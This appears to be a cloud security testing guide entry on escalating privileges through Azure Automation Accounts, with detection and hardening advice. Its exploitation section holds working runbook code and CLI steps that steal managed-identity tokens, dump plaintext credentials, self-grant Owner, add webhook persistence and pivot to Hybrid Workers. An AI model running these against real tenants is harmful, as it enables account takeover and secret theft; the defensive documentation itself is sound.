---
cstg_id: CSTG-AZURE-AUTOMATION-ACCOUNTS-PRIVESC
title: "AZURE Automation Accounts - Privilege Escalation"
provider: azure
service: automation-accounts
phase: privilege-escalation
required_access: assumed-breach
required_permissions:
  - Microsoft.Automation/automationAccounts/runbooks/write
  - Microsoft.Automation/automationAccounts/runbooks/draft/write
  - Microsoft.Automation/automationAccounts/runbooks/publish/action
  - Microsoft.Automation/automationAccounts/jobs/write
  - Microsoft.Automation/automationAccounts/jobs/read
  - Microsoft.Automation/automationAccounts/webhooks/action
  - Microsoft.Automation/automationAccounts/hybridRunbookWorkerGroups/write
  - Microsoft.Automation/automationAccounts/credentials/read
  - Microsoft.Automation/automationAccounts/connections/read
references:
  - "https://learn.microsoft.com/en-us/azure/automation/automation-security-overview"
  - "https://learn.microsoft.com/en-us/azure/automation/enable-managed-identity-for-automation"
  - "https://learn.microsoft.com/en-us/rest/api/automation/runbook"
  - "https://hackingthe.cloud/azure/abusing-managed-identities/"
  - "https://www.netspi.com/blog/technical-blog/cloud-pentesting/maintaining-azure-persistence-via-automation-accounts/"
  - "https://learn.microsoft.com/en-us/azure/automation/automation-runbook-execution"
license: CC BY-SA 4.0
---

## Summary

An Automation Account is a code-execution primitive that runs under an attached identity. If a principal can author or modify a runbook and start a job, that runbook executes with the privileges of the account's **managed identity** (or legacy **Run As** service principal). When that identity holds roles broader than the calling principal — a very common configuration, since automation is routinely granted Contributor or Owner to manage resources — running a runbook is a direct privilege-escalation path: the attacker's effective permissions become those of the identity.

Two distinct escalation outcomes exist:

1. **Identity assumption / token theft.** A runbook authenticates with the managed identity (via the IMDS endpoint inside the sandbox) or the Run As certificate, then either acts directly or exfiltrates a bearer token usable from anywhere.
2. **Secret harvesting.** A runbook reads credential, certificate, and encrypted-variable assets in cleartext (these are decrypted inside the job sandbox) and connection-string contents, yielding credentials for downstream systems.

This page enumerates, per enabling permission, how each maps to an escalation path. It assumes an assumed-breach foothold with some level of write access to an Automation Account discovered in [Automation Accounts - Enumeration](../02-services/azure-automation-accounts-enum.md).

## Prerequisites

- An authenticated principal with one or more of the write/action permissions listed in the frontmatter, scoped to a target Automation Account whose identity is more privileged than the principal.
- The account must have a usable identity: a system-assigned or user-assigned managed identity, or a legacy Run As account with a valid certificate asset.
- Network egress from the Automation sandbox is available by default for managed-identity token requests; Hybrid Worker execution requires a registered, online worker.

## Enumeration

Before exploitation, confirm the escalation is worthwhile by establishing the identity's privilege delta. From the enumeration page:

```bash
PRINCIPAL=$(az automation account show -g <rg> -n <account> --query identity.principalId -o tsv)
# Roles held by the account identity
az role assignment list --assignee "$PRINCIPAL" --all -o table
# Compare against the caller's own roles
az role assignment list --assignee "$(az ad signed-in-user show --query id -o tsv)" --all -o table
```

If the identity holds Contributor/Owner/User Access Administrator at a scope the caller does not, the paths below escalate.

## Misconfigurations & Findings

- Account identity holds privileged roles (Owner, Contributor, User Access Administrator) at subscription or management-group scope.
- Caller can write/publish runbooks or start jobs but is otherwise low-privileged (e.g. Automation Operator + Automation Contributor on a single account).
- Credential, certificate, and encrypted-variable assets present and readable by the job sandbox.
- Legacy Run As certificate still installed and exportable.
- Hybrid Runbook Worker groups registered, allowing job execution as the worker machine's local context (often SYSTEM) on a network-connected host.
- Run As / managed identity granted `Microsoft.Authorization/roleAssignments/write` (User Access Administrator), enabling self-granting of higher roles.

## Exploitation

The general technique is: place attacker-controlled code into a runbook, publish it, and start a job. Inside the sandbox the code authenticates as the identity. The following subsections map each enabling permission to a concrete path.

### Microsoft.Automation/automationAccounts/runbooks/write

Write access lets the attacker overwrite an existing runbook's draft or create a new one containing arbitrary code. Combined with publish + job start (below), this is the core execution primitive. Minimal PowerShell runbook body that authenticates as the system-assigned managed identity and returns a management-plane token:

```powershell
# runbook body
Connect-AzAccount -Identity | Out-Null
$ctx = Get-AzAccessToken -ResourceUrl "https://management.azure.com/"
Write-Output $ctx.Token
# Optionally: act directly, e.g. grant the caller Owner
# New-AzRoleAssignment -ObjectId <attackerObjectId> -RoleDefinitionName Owner -Scope "/subscriptions/<sub>"
```

Create/replace and import via CLI:

```bash
az automation runbook create -g <rg> --automation-account-name <account> \
  -n pwn --type PowerShell
az automation runbook replace-content -g <rg> --automation-account-name <account> \
  -n pwn --content @runbook.ps1
```

The same approach works for Python runbooks using the IMDS endpoint directly:

```python
import requests, os
imds = os.environ.get("IDENTITY_ENDPOINT")
hdr  = {"X-IDENTITY-HEADER": os.environ.get("IDENTITY_HEADER")}
r = requests.get(f"{imds}?resource=https://management.azure.com/&api-version=2019-08-01", headers=hdr)
print(r.json()["access_token"])
```

### Microsoft.Automation/automationAccounts/runbooks/draft/write and .../runbooks/publish/action

Draft write stages content; publish promotes it to the executable Published slot. Both are required to make authored code runnable through normal job start (drafts can also be test-run, see below).

```bash
az automation runbook publish -g <rg> --automation-account-name <account> -n pwn
```

### Microsoft.Automation/automationAccounts/jobs/write (start a job) and .../jobs/read

Starting a job executes the published runbook under the identity. Reading the job's output streams returns whatever the runbook printed — tokens, decrypted secrets, dumped assets.

```bash
JOB=$(az automation runbook start -g <rg> --automation-account-name <account> -n pwn --query jobId -o tsv)
# Poll and read output
az automation job show -g <rg> --automation-account-name <account> --job-id "$JOB" --query status
az automation job get-output -g <rg> --automation-account-name <account> --job-id "$JOB"   # if available, else stream API
```

Note: a runbook can be **test-executed from its draft slot** without publishing, which only requires draft write + a test-job action and is a quieter variant — no published artifact is produced.

Once a management-plane token for the identity is in hand, it can be used off-box from any machine:

```bash
curl -s -H "Authorization: Bearer <stolenToken>" \
  "https://management.azure.com/subscriptions/<sub>/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01"
```

A token requested for `https://graph.microsoft.com/` instead lets the identity act against Entra ID (e.g. if it has directory roles or app-role assignments).

### Reading assets: .../credentials/read, .../connections/read, variables, certificates

The sandbox can decrypt and read every shared asset regardless of the caller's data-plane visibility outside the job:

```powershell
# Inside a runbook
Get-AutomationConnection -Name "AzureRunAsConnection"          # SP appId, tenant, cert thumbprint
$cred = Get-AutomationPSCredential -Name "<credAsset>"          # username + plaintext password
Write-Output $cred.GetNetworkCredential().Password
Get-AutomationVariable -Name "<encryptedVar>"                   # decrypted value
```

For a legacy Run As account, the certificate asset can be exported from the sandbox and reassembled offline, then used with `Connect-AzAccount -ServicePrincipal -CertificateThumbprint ...` from any host — a durable, identity-bound credential.

### Microsoft.Authorization/roleAssignments/write held by the identity

If the assumed identity holds User Access Administrator (or Owner), the runbook self-escalates by assigning the attacker's principal a higher role, converting transient sandbox execution into a permanent grant:

```powershell
Connect-AzAccount -Identity | Out-Null
New-AzRoleAssignment -ObjectId "<attackerObjectId>" `
  -RoleDefinitionName "Owner" -Scope "/subscriptions/<sub>"
```

### Microsoft.Automation/automationAccounts/webhooks/action

Creating a webhook produces an unauthenticated HTTPS trigger for a runbook. This both enables out-of-band execution (escalation by anyone with the URL) and is a persistence mechanism — see the persistence page.

```bash
az automation webhook create -g <rg> --automation-account-name <account> \
  -n trigger --runbook-name pwn --expiry-time "2027-01-01T00:00:00Z" --is-enabled true
# The full URL with token is returned ONLY in this response — capture it now
```

### Microsoft.Automation/automationAccounts/hybridRunbookWorkerGroups/write

Targeting a runbook at a Hybrid Worker group runs it on the worker machine in that machine's local security context (frequently SYSTEM), not in the Azure sandbox. This pivots from cloud control-plane access into code execution on an on-premises or other-cloud host and onto its network.

```bash
az automation runbook start -g <rg> --automation-account-name <account> \
  -n pwn --run-on <hybridWorkerGroup>
```

## Detection & Logging

- **Azure Activity Logs** record `Microsoft.Automation/automationAccounts/runbooks/write`, `.../runbooks/draft/write`, `.../runbooks/publish/action`, `.../jobs/write`, and `.../webhooks/action`. The high-fidelity escalation signature is a `runbooks/write` followed within seconds by a publish and a job start from the same principal.
- **Automation Job logs / Job Streams** (when forwarded to Log Analytics) capture runbook execution and output; anomalous new runbook names, or runbooks emitting tokens/credentials to output, are detectable.
- A managed-identity token minted inside a runbook and then used from an external IP appears in **Entra ID sign-in logs** as the service-principal/managed-identity sign-in; the source IP not matching Azure Automation egress ranges is a strong indicator of token theft.
- New role assignments created by the identity appear in Activity Logs as `Microsoft.Authorization/roleAssignments/write` attributed to the managed identity — unusual for an automation principal.
- Microsoft Defender for Cloud raises alerts for suspicious Automation Account modifications when onboarded.

## Remediation & Hardening

- Right-size the account identity: grant the minimum roles at the narrowest scope; never assign Owner/Contributor/User Access Administrator at subscription scope to an Automation identity by default.
- Separate duties so that principals who can author/publish runbooks are not the same as those who manage the identity's role assignments.
- Restrict `Microsoft.Automation/automationAccounts/runbooks/*` and `.../jobs/write` to a small, audited group; treat them as code-execution rights.
- Eliminate legacy Run As accounts and their certificate assets; use managed identities.
- Move secrets into Key Vault accessed at runtime via the identity with tightly scoped access policies, instead of credential/variable assets that any job can decrypt.
- Enable diagnostic settings (JobLogs, JobStreams) to Log Analytics and alert on runbook create/publish/start sequences and on managed-identity sign-ins from non-Azure IPs.
- Where Hybrid Workers are used, run the worker service as a low-privileged account, not SYSTEM, and segment worker hosts.

## Tools

- **Azure CLI (az)** / **Azure PowerShell (Az.Automation)** — author, publish, and start runbooks; create webhooks.
- **PowerZure** — automates managed-identity token retrieval and asset dumping through Automation runbooks.
- **MicroBurst** — `Get-AzPasswords` and related functions extract Automation credentials, certificates, and Run As secrets via job execution.
- **Azure REST API** — direct draft/publish/job and test-job calls for quieter execution.

## References

- Automation security overview — https://learn.microsoft.com/en-us/azure/automation/automation-security-overview
- Managed identity for Automation — https://learn.microsoft.com/en-us/azure/automation/enable-managed-identity-for-automation
- Runbook REST API — https://learn.microsoft.com/en-us/rest/api/automation/runbook
- Runbook execution model — https://learn.microsoft.com/en-us/azure/automation/automation-runbook-execution
- Abusing managed identities — https://hackingthe.cloud/azure/abusing-managed-identities/
- Maintaining Azure persistence via Automation Accounts — https://www.netspi.com/blog/technical-blog/cloud-pentesting/maintaining-azure-persistence-via-automation-accounts/
